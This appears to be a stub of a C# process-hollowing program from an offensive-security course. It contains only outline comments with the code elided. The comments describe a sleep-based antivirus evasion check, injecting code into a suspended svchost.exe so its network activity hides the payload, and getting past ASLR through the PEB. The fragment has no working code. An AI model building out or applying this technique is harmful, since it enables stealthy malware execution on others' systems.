...
// ProcessHollowing Implementation in Csharp
// aeo
namespace ProcessHollowing
{
    public class Program
    {
        ...
        {
            // OSEP Sleep AV Evasion: Sleep for 10s and detect if time really passed
	    ...
	    // svchost.exe is stealthy as it conducts network activity
	    // we suspend the process, inject code, resume the process/thread
	    //
	    ...
	    // EntryPoint of the targeted process exe
	    ...
	    // ASLR is circumvented by calculating the offset
            // PEB, we have to add:
